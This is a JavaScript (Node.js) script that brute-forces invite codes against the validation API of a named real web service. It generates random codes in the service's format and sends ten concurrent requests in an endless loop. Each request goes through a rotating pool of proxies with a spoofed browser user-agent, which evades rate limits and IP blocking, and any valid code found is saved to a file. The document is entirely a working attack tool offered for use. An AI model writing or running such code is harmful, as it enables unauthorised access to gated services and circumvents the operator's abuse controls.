const axios = require('axios');
const fs = require('fs');
const { HttpsProxyAgent } = require('https-proxy-agent');

const CONFIG = {
    API_URL: 'https://app.yoso.fun/api/invite/validate',
    ALPHANUM: 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789',
    CONCURRENCY: 10, // Adjust based on your PC/Proxy speed
    PROXY_FILE: 'proxy.txt'
};

// --- Proxy Loader ---
function loadProxies() {
    try {
        const data = fs.readFileSync(CONFIG.PROXY_FILE, 'utf8');
        return data.split('\n')
            .map(p => p.trim())
            .filter(p => p.length > 0);
    } catch (err) {
        console.error("❌ Error: Could not find proxy.txt. Please create it.");
        process.exit(1);
    }
}

const ALL_PROXIES = loadProxies();
console.log(`✅ Loaded ${ALL_PROXIES.length} proxies from ${CONFIG.PROXY_FILE}`);

// --- Helpers ---
const generateCode = () => {
    const gen = (len) => Array.from({ length: len }, () => 
        CONFIG.ALPHANUM[Math.floor(Math.random() * CONFIG.ALPHANUM.length)]
    ).join('');
    const midLen = [7, 8, 9][Math.floor(Math.random() * 3)];
    return `YOSO_${gen(midLen)}_${gen(2)}`;
};

async function validate(attempt) {
    const testCode = generateCode();
    
    // Pick a random proxy for this specific request
    const proxyUrl = ALL_PROXIES[Math.floor(Math.random() * ALL_PROXIES.length)];
    const agent = new HttpsProxyAgent(proxyUrl);

    try {
        const response = await axios.get(CONFIG.API_URL, {
            params: { code: testCode },
            headers: {
                'accept': '*/*',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0',
            },
            httpsAgent: agent,
            proxy: false,
            timeout: 8000 // Higher timeout for proxies
        });

        if (response.data.valid) {
            console.log(`\n🌟 [JACKPOT]: ${testCode} IS VALID! 🌟`);
            fs.appendFileSync('valid_codes.txt', `${testCode}\n`);
            process.exit(0);
        }
        console.log(`[#${attempt}] ❌ Invalid: ${testCode} | IP: ${proxyUrl.split('@')[1] || proxyUrl}`);
    } catch (error) {
        console.log(`[#${attempt}] ⚠️ Error (${error.response?.status || 'ConnErr'}) using proxy ${proxyUrl.split('@')[1] || 'Unknown'}`);
    }
}

// --- Main Loop ---
async function run() {
    let attempts = 0;
    while (true) {
        const tasks = [];
        for (let i = 0; i < CONFIG.CONCURRENCY; i++) {
            tasks.push(validate(++attempts));
        }
        await Promise.all(tasks);
    }
}

run();
